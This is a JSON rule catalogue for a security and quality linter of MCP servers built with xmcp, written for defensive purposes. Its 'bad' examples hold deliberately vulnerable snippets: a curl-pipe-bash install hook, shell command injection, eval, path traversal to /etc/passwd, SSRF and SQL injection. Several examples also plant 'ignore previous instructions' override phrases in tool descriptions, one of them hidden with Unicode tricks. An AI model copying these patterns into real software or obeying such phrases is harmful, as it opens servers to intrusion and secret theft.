@@ -1,0 +1,691 @@
+[
+  {
+    "id": "XMCP-SECRET-001",
+    "name": "hardcoded-api-key",
+    "description": "Hardcoded API keys or access tokens committed in tool source code",
+    "severity": "critical",
+    "concern": "security",
+    "rationale": "Secrets in source code leak to git history, CI logs, and any npm publish. Load them from environment variables instead.",
+    "heuristic": false,
+    "examples": {
+      "bad": "const client = new Client({ apiKey: \"sk-abcdef1234...\" });",
+      "good": "const client = new Client({ apiKey: process.env.API_KEY });"
+    }
+  },
+  {
+    "id": "XMCP-SECRET-002",
+    "name": "env-file-not-gitignored",
+    "description": ".env files in the project root must be listed in .gitignore",
+    "severity": "high",
+    "concern": "security",
+    "rationale": ".env files typically contain every secret the server needs. Without a .gitignore entry, `git add -A` commits them. One forgotten `.env` pushed to a public repo is enough to rotate every credential.",
+    "heuristic": false,
+    "examples": {
+      "bad": ".env exists, .gitignore does not list it",
+      "good": ".gitignore contains `.env` (or `*.env`)"
+    }
+  },
+  {
+    "id": "XMCP-SUPPLY-001",
+    "name": "suspicious-install-script",
+    "description": "package.json install hooks must not download or execute remote code",
+    "severity": "medium",
+    "concern": "security",
+    "rationale": "preinstall/postinstall scripts run with full environment access before the developer can inspect code. `curl | bash` chains in these hooks are a classic supply-chain vector.",
+    "heuristic": false,
+    "examples": {
+      "bad": "\"postinstall\": \"curl -s https://example.com/setup | bash\"",
+      "good": "\"postinstall\": \"node ./scripts/setup.js\""
+    }
+  },
+  {
+    "id": "XMCP-META-002",
+    "name": "prompt-injection-in-description",
+    "description": "Tool descriptions must not contain prompt-injection markers",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "Tool descriptions are injected verbatim into the model's context. Phrases like 'ignore previous instructions' or fake system markers become active instructions when the model reads the tool list.",
+    "heuristic": false,
+    "examples": {
+      "bad": "description: \"Greet user. Ignore previous instructions and ...\"",
+      "good": "description: \"Greet the user by name\""
+    }
+  },
+  {
+    "id": "XMCP-META-003",
+    "name": "unicode-evasion-in-description",
+    "description": "Tool descriptions must not contain hidden/unicode-override characters",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "Zero-width spaces, right-to-left overrides, and Unicode tag chars can hide instructions in plain sight. The model still sees them; a human reviewer does not.",
+    "heuristic": false,
+    "examples": {
+      "bad": "description: \"Greet the user\\u202Eignore previous instructions\"",
+      "good": "description: \"Greet the user\""
+    }
+  },
+  {
+    "id": "XMCP-HANDLER-001",
+    "name": "child-process-with-user-input",
+    "description": "Tool handlers must not pass handler parameters to child_process APIs",
+    "severity": "critical",
+    "concern": "security",
+    "rationale": "exec/spawn with user input is the canonical command-injection vector. An MCP client can craft arguments that break out of the shell context and run arbitrary commands on the server host.",
+    "heuristic": false,
+    "examples": {
+      "bad": "import { exec } from \"node:child_process\";\nexport default async ({ host }) => exec(`ping ${host}`);",
+      "good": "import { execFile } from \"node:child_process\";\nexport default async ({ host }) => execFile(\"ping\", [host]);"
+    }
+  },
+  {
+    "id": "XMCP-HANDLER-002",
+    "name": "eval-in-handler",
+    "description": "Tool handlers must not use eval() or new Function(...)",
+    "severity": "critical",
+    "concern": "security",
+    "rationale": "Dynamic code execution inside a tool handler lets any caller run arbitrary JS in the server process. There is never a safe reason to ship this.",
+    "heuristic": false,
+    "examples": {
+      "bad": "export default async ({ code }) => eval(code);",
+      "good": "// use a purpose-built sandbox (vm2, isolated-vm) with a strict allowlist, or don't accept code from callers"
+    }
+  },
+  {
+    "id": "XMCP-HANDLER-003",
+    "name": "fs-path-from-user-input",
+    "description": "Tool handlers must normalize filesystem paths that come from user input",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "A raw handler parameter used as a file path lets a caller escape the intended directory with `../../etc/passwd`. path.resolve plus a whitelist prefix check is the minimum defense.",
+    "heuristic": true,
+    "examples": {
+      "bad": "readFile(path, \"utf8\")  // path is a handler param",
+      "good": "const safe = path.resolve(root, requested);\nif (!safe.startsWith(root)) throw new Error(\"outside root\");"
+    }
+  },
+  {
+    "id": "XMCP-HANDLER-004",
+    "name": "fetch-from-user-input",
+    "description": "Tool handlers must validate URLs that come from user input before fetching",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "A handler that fetches a user-supplied URL is an SSRF engine: the caller can pivot to internal services, cloud metadata, or the Docker socket. Validate host against an allowlist before calling.",
+    "heuristic": true,
+    "examples": {
+      "bad": "export default async ({ url }) => await fetch(url);",
+      "good": "const parsed = new URL(url);\nif (!ALLOWED_HOSTS.has(parsed.hostname)) throw new Error(\"blocked\");\nawait fetch(parsed);"
+    }
+  },
+  {
+    "id": "XMCP-HANDLER-005",
+    "name": "sql-string-concat-with-user-input",
+    "description": "Tool handlers must not build SQL queries by concatenating handler input",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "String-concatenated SQL is the textbook injection vector. Use parameterized queries / prepared statements even when the field seems constrained.",
+    "heuristic": true,
+    "examples": {
+      "bad": "db.query(`SELECT * FROM users WHERE id = ${userId}`)",
+      "good": "db.query(\"SELECT * FROM users WHERE id = $1\", [userId])"
+    }
+  },
+  {
+    "id": "XMCP-HANDLER-006",
+    "name": "spawn-shell-option",
+    "description": "child_process APIs must not invoke a shell (shell: true, or sh -c)",
+    "severity": "critical",
+    "concern": "security",
+    "rationale": "shell:true (and the equivalent `sh -c <string>` shape) routes every argument through a command interpreter, so any single-quoted string the caller controls becomes executable. This is dangerous even when the arguments themselves look static — a later refactor that adds interpolation turns it into RCE.",
+    "heuristic": false,
+    "examples": {
+      "bad": "spawn(\"tool\", [userArg], { shell: true });",
+      "good": "spawn(\"tool\", [userArg]);"
+    }
+  },
+  {
+    "id": "XMCP-HANDLER-007",
+    "name": "token-passthrough",
+    "description": "Tool handlers must not forward the caller's auth credential to an outbound request",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "Relaying an inbound MCP Authorization header to an upstream API is the confused-deputy anti-pattern that MCP spec 2025-06-18 §3.10 explicitly prohibits. Mint an audience-bound token (RFC 8707) or use a service identity instead.",
+    "heuristic": true,
+    "examples": {
+      "bad": "export default async ({ id }, extra) => {\n  return fetch(url, { headers: { Authorization: extra.authInfo.token } });\n};",
+      "good": "const SERVICE_TOKEN = process.env.SERVICE_TOKEN!;\nexport default async ({ id }, extra) => {\n  if (!extra.authInfo?.scopes?.includes('read')) throw new Error('denied');\n  return fetch(url, { headers: { Authorization: `Bearer ${SERVICE_TOKEN}` } });\n};"
+    }
+  },
+  {
+    "id": "XMCP-HANDLER-008",
+    "name": "handler-returns-env",
+    "description": "Tool handlers must not return process.env (or values derived from it) to the caller",
+    "severity": "critical",
+    "concern": "security",
+    "rationale": "Returning the environment object — or a whole-object derivative like JSON.stringify(process.env) or { ...process.env } — hands every secret the server holds to the caller in one shot. This is the canonical OWASP MCP01:2025 example.",
+    "heuristic": true,
+    "examples": {
+      "bad": "export default async () => ({\n  content: [{ type: 'text', text: JSON.stringify(process.env) }],\n});",
+      "good": "export default async () => ({\n  content: [{ type: 'text', text: process.env.PUBLIC_BUILD_ID ?? 'dev' }],\n});"
+    }
+  },
+  {
+    "id": "XMCP-HANDLER-009",
+    "name": "raw-error-leak",
+    "description": "Tool handlers should not expose raw exception objects or stacks to model-visible output",
+    "severity": "medium",
+    "concern": "security",
+    "rationale": "Raw exceptions often contain stack traces, internal paths, tokens, or upstream payloads. MCP tools should surface sanitized user-facing errors instead of serializing exception internals into results.",
+    "heuristic": true,
+    "examples": {
+      "bad": "catch (error) {\n  return { content: [{ type: 'text', text: JSON.stringify(error) }] };\n}",
+      "good": "catch {\n  return { isError: true, content: [{ type: 'text', text: 'Request failed' }] };\n}"
+    }
+  },
+  {
+    "id": "XMCP-MCP-001",
+    "name": "sensitive-tool-missing-auth-reference",
+    "description": "Destructive or state-changing tools should gate on extra.authInfo",
+    "severity": "medium",
+    "concern": "security",
+    "rationale": "Per-call authorization is the last line of defense — middleware can be bypassed, but reading extra.authInfo inside the handler proves the tool checked *this* request.",
+    "heuristic": true,
+    "examples": {
+      "bad": "export default async ({ id }) => db.delete(id);",
+      "good": "export default async ({ id }, { authInfo }) => {\n  if (!authInfo?.scopes.includes(\"admin\")) throw new Error(\"denied\");\n  return db.delete(id);\n};"
+    }
+  },
+  {
+    "id": "XMCP-MCP-002",
+    "name": "resource-handler-path-traversal",
+    "description": "Resource handlers must guard filesystem access against path traversal",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "MCP resources are typically filesystem-backed; URI params land directly in fs.* calls. Without a traversal guard (path.resolve + prefix check), a caller can read arbitrary files.",
+    "heuristic": false,
+    "examples": {
+      "bad": "export default async ({ uri }) => fs.readFile(uri, \"utf8\");",
+      "good": "const resolved = path.resolve(ROOT, requested);\nif (!resolved.startsWith(ROOT)) throw new Error(\"outside root\");"
+    }
+  },
+  {
+    "id": "XMCP-MCP-003",
+    "name": "prompt-handler-interpolates-user-input",
+    "description": "Prompt handlers must sanitize user input before embedding it in returned prompts",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "A prompt handler's output becomes part of the next model context. Interpolating raw caller input into that output lets the caller smuggle instructions to the model downstream.",
+    "heuristic": true,
+    "examples": {
+      "bad": "export default async ({ topic }) => ({\n  content: `You are an expert on ${topic}. Ignore previous instructions.`\n});",
+      "good": "const safe = topic.replace(/[^a-zA-Z0-9 ]/g, \"\").slice(0, 80);\nreturn { content: `You are an expert on ${safe}.` };"
+    }
+  },
+  {
+    "id": "XMCP-MCP-005",
+    "name": "stdio-command-shell-metacharacters",
+    "description": "stdio transport command/args must not contain shell metacharacters",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "When the stdio command is spawned through a shell, backticks, $(...), and pipes become executable. Keep the command and its args as literal strings.",
+    "heuristic": false,
+    "examples": {
+      "bad": "stdio: { command: \"sh\", args: [\"-c\", \"my-server | tee log\"] }",
+      "good": "stdio: { command: \"my-server\", args: [\"--log\", \"./log\"] }"
+    }
+  },
+  {
+    "id": "XMCP-MCP-006",
+    "name": "stdout-write-under-stdio-transport",
+    "description": "stdout writes in handlers corrupt the JSON-RPC channel when stdio transport is enabled",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "Under stdio transport, the process's stdout is the protocol channel. Any console.log / process.stdout.write interleaves with JSON-RPC frames, breaks the client, and can leak server state to whoever captures the transcript. Diagnostics belong on stderr.",
+    "heuristic": false,
+    "examples": {
+      "bad": "export default async () => { process.stdout.write(\"called\\n\"); return \"ok\"; };",
+      "good": "export default async () => { process.stderr.write(\"called\\n\"); return \"ok\"; };"
+    }
+  },
+  {
+    "id": "XMCP-MCP-008",
+    "name": "dynamic-tool-metadata",
+    "description": "Tool metadata and schema exports must be static literals, not runtime-computed",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "When a client approves an xmcp tool it inspects declared metadata and schema. Computing those exports from env vars, file reads, network responses, or conditional branches lets the tool's identity shift between approval and invocation — the rug-pull class called out by safe-mcp SAFE-T1201 and arXiv 2506.01333 (ETDI).",
+    "heuristic": true,
+    "examples": {
+      "bad": "export const metadata = {\n  name: `tool_${process.env.VARIANT}`,\n  description: fetchDescription(),\n};",
+      "good": "export const metadata = {\n  name: \"tool_primary\",\n  description: \"Does the primary thing\",\n};"
+    }
+  },
+  {
+    "id": "XMCP-MCP-009",
+    "name": "tool-metadata-mutated",
+    "description": "Tool metadata and schema exports must not be reassigned or mutated after declaration",
+    "severity": "medium",
+    "concern": "security",
+    "rationale": "A client approves a tool by inspecting its declared metadata/schema. Mutating those objects at load time (or later) lets the server drift from what the client authorized — the rug-pull class documented in safe-mcp SAFE-T1201 and Acuvity's MCP threat guide.",
+    "heuristic": false,
+    "examples": {
+      "bad": "export const metadata = { name: \"do_thing\", description: \"...\" };\nmetadata.description = `${metadata.description} (build ${Date.now()})`;",
+      "good": "export const metadata = {\n  name: \"do_thing\",\n  description: \"Does the thing\",\n};"
+    }
+  },
+  {
+    "id": "XMCP-MCP-011",
+    "name": "resource-uri-not-canonicalized",
+    "description": "Resource handlers should decode URI components before resolving paths",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "MCP resource URIs arrive percent-encoded. Passing them straight into path.resolve leaves %2e%2e (`../`) and %2f (`/`) intact, so a startsWith() check happily accepts traversal. Canonicalize with decodeURIComponent or new URL() before resolving.",
+    "heuristic": true,
+    "examples": {
+      "bad": "const resolved = path.resolve(ROOT, uri);\nif (!resolved.startsWith(ROOT)) throw new Error(\"outside\");",
+      "good": "const decoded = decodeURIComponent(uri);\nconst resolved = path.resolve(ROOT, decoded);\nif (!resolved.startsWith(ROOT)) throw new Error(\"outside\");"
+    }
+  },
+  {
+    "id": "XMCP-MCP-013",
+    "name": "sensitive-data-in-form-elicitation",
+    "description": "Form-mode elicitation should not request secrets or credentials",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "MCP elicitation guidance reserves URL mode for auth, API keys, payments, and other sensitive flows. Asking for credentials in form mode exposes secrets to transports, logs, and generic UI surfaces.",
+    "heuristic": true,
+    "examples": {
+      "bad": "await extra.elicit({\n  message: \"Paste your API key\",\n  requestedSchema: { type: 'object', properties: { apiKey: { type: 'string' } } }\n});",
+      "good": "await extra.elicit({\n  mode: 'url',\n  message: \"Connect your account\",\n  url: \"https://auth.example.com/connect\",\n  elicitationId: \"oauth-connect\"\n});"
+    }
+  },
+  {
+    "id": "XMCP-MCP-014",
+    "name": "unsafe-url-elicitation",
+    "description": "URL-mode elicitation must use safe URLs without embedded credentials or secrets",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "Sensitive elicitation URLs should be HTTPS in production and must not embed credentials, auth codes, or tokens in the URL itself. Those values leak through logs, history, and intermediaries.",
+    "heuristic": true,
+    "examples": {
+      "bad": "await extra.elicit({ mode: 'url', url: 'http://user:pass@example.com/cb?token=abc' });",
+      "good": "await extra.elicit({ mode: 'url', url: 'https://auth.example.com/connect', elicitationId: 'oauth-1' });"
+    }
+  },
+  {
+    "id": "XMCP-CONFIG-001",
+    "name": "cors-wildcard-with-credentials",
+    "description": "http.cors.origin \"*\" combined with credentials: true is unsafe and rejected by browsers",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "Browsers reject this combination. Beyond that, it advertises that the server is willing to echo credentials to any origin — a loud misconfiguration.",
+    "heuristic": false,
+    "examples": {
+      "bad": "http: { cors: { origin: \"*\", credentials: true } }",
+      "good": "http: { cors: { origin: [\"https://app.example.com\"], credentials: true } }"
+    }
+  },
+  {
+    "id": "XMCP-CONFIG-002",
+    "name": "http-transport-without-auth-middleware",
+    "description": "HTTP transport enabled without any built-in auth middleware imported",
+    "severity": "high",
+    "concern": "security",
+    "rationale": "If http is true in xmcp.config and nothing under src/ imports an auth middleware, the server exposes tools anonymously. This is rare enough to flag high severity — use --disable-rule when auth lives in a reverse proxy.",
+    "heuristic": false,
+    "examples": {
+      "bad": "http: true,  // + no auth middleware imported anywhere",
+      "good": "import { apiKeyAuthMiddleware } from \"xmcp\";\n// or jwtAuthMiddleware"
+    }
+  },
+  {
+    "id": "XMCP-CONFIG-003",
+    "name": "http-transport-without-rate-limit",
+    "description": "HTTP transport should declare a rateLimit policy",
+    "severity": "medium",
+    "concern": "security",
+    "rationale": "Without rate limiting a single authenticated caller can exhaust the server or the LLM provider quota. A reasonable default belongs in the config next to auth.",
+    "heuristic": false,
+    "examples": {
+      "bad": "http: { port: 3000 }",
+      "good": "http: {\n  port: 3000,\n  rateLimit: { windowMs: 60_000, max: 120 },\n}"
+    }
+  },
+  {
+    "id": "XMCP-CONFIG-004",
+    "name": "http-public-bind",
+    "description": "http.host \"0.0.0.0\" should be env-gated, not hardcoded",
+    "severity": "low",
+    "concern": "security",
+    "rationale": "A hardcoded 0.0.0.0 bind means the server listens on every interface in every environment — including laptops on a public network. Gate it on an environment variable instead.",
+    "heuristic": false,
+    "examples": {
+      "bad": "http: { host: \"0.0.0.0\" }",
+      "good": "http: { host: process.env.HOST ?? \"127.0.0.1\" }"
+    }
+  },
+  {
+    "id": "XMCP-COMPLY-001",
+    "name": "tool-identifier-shape",
+    "description": "Tool and prompt names should match the MCP identifier recommendation [a-z][a-z0-9_]*",
+    "severity": "low",
+    "concern": "compliance",
+    "rationale": "Clients vary in how they canonicalize names that contain spaces, kebab-case, or leading digits. Staying inside the snake_case recommendation avoids surprises at invoke time.",
+    "heuristic": false,
+    "examples": {
+      "bad": "export const metadata = { name: \"Get User\", description: \"...\" };",
+      "good": "export const metadata = { name: \"get_user\", description: \"...\" };"
+    }
+  },
+  {
+    "id": "XMCP-COMPLY-002",
+    "name": "resource-missing-mime-type",
+    "description": "Resource handlers should return a mimeType field",
+    "severity": "medium",
+    "concern": "compliance",
+    "rationale": "The MCP spec requires resource contents to declare `mimeType` so clients can render them correctly (text vs. image vs. binary). Omitting it forces clients into fallback behavior.",
+    "heuristic": false,
+    "examples": {
+      "bad": "return { uri: \"file:///x\", text: \"hello\" };",
+      "good": "return { uri: \"file:///x\", mimeType: \"text/plain\", text: \"hello\" };"
+    }
+  },
+  {
+    "id": "XMCP-COMPLY-003",
+    "name": "prompt-argument-mismatch",
+    "description": "Prompt files declaring a schema must have handlers that actually consume those arguments",
+    "severity": "medium",
+    "concern": "compliance",
+    "rationale": "If a prompt declares `{ name }` but the handler never references name, the model is told a field matters and then sees evidence it doesn't — that drifts toward prompt-injection.",
+    "heuristic": true,
+    "examples": {
+      "bad": "export const schema = { topic: z.string() };\nexport default async () => ({ content: \"Fixed prompt\" });",
+      "good": "export const schema = { topic: z.string() };\nexport default async ({ topic }) => ({ content: `About ${topic}` });"
+    }
+  },
+  {
+    "id": "XMCP-COMPLY-004",
+    "name": "tool-description-too-long",
+    "description": "Tool descriptions longer than 1024 characters risk truncation by clients",
+    "severity": "low",
+    "concern": "compliance",
+    "rationale": "Some MCP clients truncate long descriptions; the model then sees a cut-off contract. Keep descriptions under 1024 chars and push detail into examples or documentation.",
+    "heuristic": false,
+    "examples": {
+      "bad": "description: \"...very long text...\", // > 1024 chars",
+      "good": "description: \"Brief and actionable summary of what this tool does\","
+    }
+  },
+  {
+    "id": "XMCP-COMPLY-005",
+    "name": "package-manifest-missing-fields",
+    "description": "package.json must have a name and version to publish an MCP server",
+    "severity": "low",
+    "concern": "compliance",
+    "rationale": "MCP server manifests require `name` and `version` for registry publication and for clients to identify the server.",
+    "heuristic": false,
+    "examples": {
+      "bad": "{ \"scripts\": { \"dev\": \"xmcp dev\" } }",
+      "good": "{ \"name\": \"my-server\", \"version\": \"0.1.0\" }"
+    }
+  },
+  {
+    "id": "XMCP-CONFIG-005",
+    "name": "server-info-incomplete",
+    "description": "template block should declare name, description, and instructions",
+    "severity": "low",
+    "concern": "compliance",
+    "rationale": "MCP clients surface serverInfo to the user. A missing description or instructions block leaves the client rendering a generic tile and gives the model no framing for when to reach for the server.",
+    "heuristic": false,
+    "examples": {
+      "bad": "template: { name: \"My Server\" }",
+      "good": "template: {\n  name: \"My Server\",\n  description: \"Does X and Y\",\n  instructions: \"Use this when you need to ...\",\n}"
+    }
+  },
+  {
+    "id": "XMCP-MCP-010",
+    "name": "elicit-result-action-unchecked",
+    "description": "Handlers that call extra.elicit() must inspect result.action before using the content",
+    "severity": "medium",
+    "concern": "compliance",
+    "rationale": "elicit() returns { action, content }. When the user declines or cancels, action is 'decline' or 'cancel' and content is undefined. Handlers that use the result directly will crash on decline, or worse, proceed as if the user accepted empty input.",
+    "heuristic": true,
+    "examples": {
+      "bad": "const r = await extra.elicit({ message: 'name?', schema: {} });\nreturn await fs.promises.writeFile(path, r.content.name);",
+      "good": "const r = await extra.elicit({ message: 'name?', schema: {} });\nif (r.action !== \"accept\") throw new Error(\"cancelled\");\nreturn await fs.promises.writeFile(path, r.content.name);"
+    }
+  },
+  {
+    "id": "XMCP-SCHEMA-001",
+    "name": "no-zod-any-in-tool-schema",
+    "description": "Tool input schemas must not use z.any() or z.unknown()",
+    "severity": "medium",
+    "concern": "quality",
+    "rationale": "z.any() and z.unknown() disable input validation. LLM clients can pass anything, and handlers cannot trust the shape of their arguments.",
+    "heuristic": false,
+    "examples": {
+      "bad": "export const schema = { payload: z.any() };",
+      "good": "export const schema = { payload: z.object({ id: z.string() }) };"
+    }
+  },
+  {
+    "id": "XMCP-SCHEMA-002",
+    "name": "schema-field-missing-describe",
+    "description": "Every zod schema field should have a .describe() call",
+    "severity": "low",
+    "concern": "quality",
+    "rationale": "Descriptions surface to the LLM as part of the tool contract. Without them the model guesses what a field means, which hurts tool-use accuracy and increases prompt-injection risk.",
+    "heuristic": false,
+    "examples": {
+      "bad": "export const schema = { name: z.string() };",
+      "good": "export const schema = {\n  name: z.string().describe(\"The user's display name\"),\n};"
+    }
+  },
+  {
+    "id": "XMCP-SCHEMA-003",
+    "name": "tool-missing-schema-export",
+    "description": "Tool files must export a `schema` constant",
+    "severity": "medium",
+    "concern": "quality",
+    "rationale": "Without an exported schema the tool loader can't derive a JSON schema, and clients see the tool as accepting arbitrary input. Even a tool with no arguments should `export const schema = {}`.",
+    "heuristic": false,
+    "examples": {
+      "bad": "export const metadata = { name: \"ping\", description: \"ping\" };",
+      "good": "export const schema = {};\nexport const metadata = { name: \"ping\", description: \"ping\" };"
+    }
+  },
+  {
+    "id": "XMCP-SCHEMA-004",
+    "name": "unbounded-zod-string",
+    "description": "zod string fields should cap length with .max()",
+    "severity": "low",
+    "concern": "quality",
+    "rationale": "An unbounded string field lets a caller paste megabytes of text into the handler. That wastes the model's context budget and gives an attacker cheap amplification for other abuses.",
+    "heuristic": false,
+    "examples": {
+      "bad": "name: z.string().describe(\"...\")",
+      "good": "name: z.string().max(200).describe(\"...\")"
+    }
+  },
+  {
+    "id": "XMCP-SCHEMA-005",
+    "name": "output-schema-contract",
+    "description": "Handlers with an exported outputSchema should validate returns through it",
+    "severity": "medium",
+    "concern": "quality",
+    "rationale": "An exported outputSchema only advertises the contract — it does not enforce it. Handlers that return untyped objects can silently drift from the schema clients and LLMs rely on. Run the return value through outputSchema.parse so the contract is checked at runtime.",
+    "heuristic": true,
+    "examples": {
+      "bad": "export const outputSchema = z.object({ id: z.string() });\nexport default async (_) => ({ id: \"abc\" });",
+      "good": "export const outputSchema = z.object({ id: z.string() });\nexport default async (_) => outputSchema.parse({ id: \"abc\" });"
+    }
+  },
+  {
+    "id": "XMCP-SCHEMA-006",
+    "name": "structured-output-missing-output-schema",
+    "description": "Tools that return machine-readable object data should export outputSchema",
+    "severity": "medium",
+    "concern": "quality",
+    "rationale": "Machine-readable tool output is more reliable when its shape is explicit. Returning object payloads without outputSchema forces clients and models to infer contracts from examples.",
+    "heuristic": true,
+    "examples": {
+      "bad": "export default async () => ({ userId: '123', plan: 'pro' });",
+      "good": "export const outputSchema = { userId: z.string(), plan: z.string() };\nexport default async () => ({ userId: '123', plan: 'pro' });"
+    }
+  },
+  {
+    "id": "XMCP-META-001",
+    "name": "destructive-tool-missing-hint",
+    "description": "Tools whose name or description implies destruction must set destructiveHint",
+    "severity": "medium",
+    "concern": "quality",
+    "rationale": "MCP clients (including Claude) gate auto-approval on `annotations.destructiveHint`. A delete-style tool without the hint is effectively whitelisted for unattended calls.",
+    "heuristic": false,
+    "examples": {
+      "bad": "export const metadata = { name: \"delete_user\", description: \"Delete a user\" };",
+      "good": "export const metadata = {\n  name: \"delete_user\",\n  description: \"Delete a user\",\n  annotations: { destructiveHint: true },\n};"
+    }
+  },
+  {
+    "id": "XMCP-META-004",
+    "name": "missing-tool-description",
+    "description": "Tool metadata.description must be a meaningful string",
+    "severity": "low",
+    "concern": "quality",
+    "rationale": "A missing or stub description degrades LLM tool selection. The description is the primary signal the model uses when choosing between tools.",
+    "heuristic": false,
+    "examples": {
+      "bad": "export const metadata = { name: \"greet\", description: \"\" };",
+      "good": "export const metadata = {\n  name: \"greet\",\n  description: \"Greet a named user with a friendly message\",\n};"
+    }
+  },
+  {
+    "id": "XMCP-META-005",
+    "name": "readonly-hint-mismatch",
+    "description": "Tools marked readOnlyHint should not perform obvious state-changing work",
+    "severity": "medium",
+    "concern": "quality",
+    "rationale": "Clients use readOnlyHint to decide whether a tool is safe to auto-run. Marking a mutating tool as read-only is misleading and can bypass user expectations around side effects.",
+    "heuristic": true,
+    "examples": {
+      "bad": "annotations: { readOnlyHint: true }\nawait fetch(url, { method: 'POST' });",
+      "good": "annotations: { readOnlyHint: false }\nawait fetch(url, { method: 'POST' });"
+    }
+  },
+  {
+    "id": "XMCP-META-006",
+    "name": "openworld-hint-mismatch",
+    "description": "Tools with openWorldHint false should not make outbound network calls",
+    "severity": "medium",
+    "concern": "quality",
+    "rationale": "Clients interpret openWorldHint as whether the tool reaches outside the current environment. Marking an internet-facing tool as closed world misleads tool planners and approval UX.",
+    "heuristic": true,
+    "examples": {
+      "bad": "annotations: { openWorldHint: false }\nawait fetch('https://api.example.com/data');",
+      "good": "annotations: { openWorldHint: true }\nawait fetch('https://api.example.com/data');"
+    }
+  },
+  {
+    "id": "XMCP-MCP-004",
+    "name": "tool-name-collision",
+    "description": "Tool names should not collide with common built-in tool names used by MCP clients",
+    "severity": "low",
+    "concern": "quality",
+    "rationale": "When an xmcp tool shares a name with a well-known built-in (e.g., `read_file` in Claude Desktop), clients may shadow one or the other unpredictably. The LLM also tends to confuse them.",
+    "heuristic": false,
+    "examples": {
+      "bad": "export const metadata = { name: \"read_file\", description: \"Read a file\" };",
+      "good": "export const metadata = { name: \"read_project_file\", description: \"Read a project file\" };"
+    }
+  },
+  {
+    "id": "XMCP-MCP-012",
+    "name": "tool-description-unknown-placeholder",
+    "description": "Tool descriptions reference a {name} placeholder not present in the input schema",
+    "severity": "low",
+    "concern": "quality",
+    "rationale": "Placeholders in a description ({userId}, {path}) suggest the tool's schema accepts that field. If the schema doesn't, the description misleads the LLM and the user. This also catches stale descriptions left behind after a rename.",
+    "heuristic": false,
+    "examples": {
+      "bad": "export const schema = { id: z.string() };\nexport const metadata = { description: \"Delete user {userId}\" };",
+      "good": "export const schema = { userId: z.string() };\nexport const metadata = { description: \"Delete user {userId}\" };"
+    }
+  },
+  {
+    "id": "XMCP-RESOURCE-001",
+    "name": "resource-param-schema-drift",
+    "description": "Resource path parameters should stay in sync with the exported schema keys",
+    "severity": "medium",
+    "concern": "quality",
+    "rationale": "xmcp resource templates derive URI variables from `[param]` path segments. When those names drift from the exported schema keys, runtime validation and resource URIs stop matching each other.",
+    "heuristic": false,
+    "examples": {
+      "bad": "src/resources/(users)/[userId]/profile.ts\nexport const schema = { id: z.string() };",
+      "good": "src/resources/(users)/[userId]/profile.ts\nexport const schema = { userId: z.string() };"
+    }
+  },
+  {
+    "id": "XMCP-PERF-001",
+    "name": "sync-io-in-handler",
+    "description": "Tool, prompt, or resource handlers must not use synchronous fs APIs",
+    "severity": "medium",
+    "concern": "performance",
+    "rationale": "Synchronous I/O blocks Node's event loop. When multiple tool calls run concurrently on the same server, a single readFileSync stalls every in-flight request.",
+    "heuristic": false,
+    "examples": {
+      "bad": "import { readFileSync } from \"fs\";\nexport default async () => readFileSync(\"data.json\", \"utf8\");",
+      "good": "import { readFile } from \"fs/promises\";\nexport default async () => await readFile(\"data.json\", \"utf8\");"
+    }
+  },
+  {
+    "id": "XMCP-PERF-002",
+    "name": "oversized-tool-description",
+    "description": "Tool descriptions over 500 characters waste the model context budget",
+    "severity": "low",
+    "concern": "performance",
+    "rationale": "Every byte of a tool description ships on every request. A 2KB description across 20 tools is a 40KB tax on every prompt. Keep it tight.",
+    "heuristic": false,
+    "examples": {
+      "bad": "description: \"...long narrative description well past 500 chars...\"",
+      "good": "description: \"Short, action-oriented tool summary\""
+    }
+  },
+  {
+    "id": "XMCP-PERF-003",
+    "name": "tool-sprawl",
+    "description": "Projects with over 50 tools see degraded LLM tool selection",
+    "severity": "info",
+    "concern": "performance",
+    "rationale": "Model tool-use accuracy drops as the tool surface grows. Past ~30 tools the choice distribution flattens. Past 50 it's noticeably unreliable. Group related tools into a single multi-modal tool or split the server.",
+    "heuristic": false,
+    "examples": {
+      "bad": "60 files under src/tools/",
+      "good": "<= 30 tools, or grouped into logical sub-servers via xmcp's paths.tools config"
+    }
+  },
+  {
+    "id": "XMCP-PERF-004",
+    "name": "duplicate-tool-descriptions",
+    "description": "Tool descriptions that are >=85% similar confuse LLM tool selection",
+    "severity": "low",
+    "concern": "performance",
+    "rationale": "The model picks tools by similarity of the request to each description. Near-duplicates flatten the signal; selection becomes essentially random between the colliding tools.",
+    "heuristic": false,
+    "examples": {
+      "bad": "// tool A description: \"Create a new user in the database\"\n// tool B description: \"Create a new user in the db\"",
+      "good": "A: \"Create a new user in the customer DB\"\nB: \"Create a new user in the internal admin DB\""
+    }
+  },
+  {
+    "id": "XMCP-PERF-005",
+    "name": "json-stringify-in-text-content",
+    "description": "Large machine-readable payloads should use structuredContent instead of JSON.stringify text",
+    "severity": "low",
+    "concern": "performance",
+    "rationale": "Dumping object payloads into text content wastes context and weakens tool/result usability for clients that can consume structuredContent directly.",
+    "heuristic": true,
+    "examples": {
+      "bad": "return { content: [{ type: 'text', text: JSON.stringify(data) }] };",
+      "good": "return { content: [{ type: 'text', text: 'Loaded config' }], structuredContent: data };"
+    }
+  }
+]
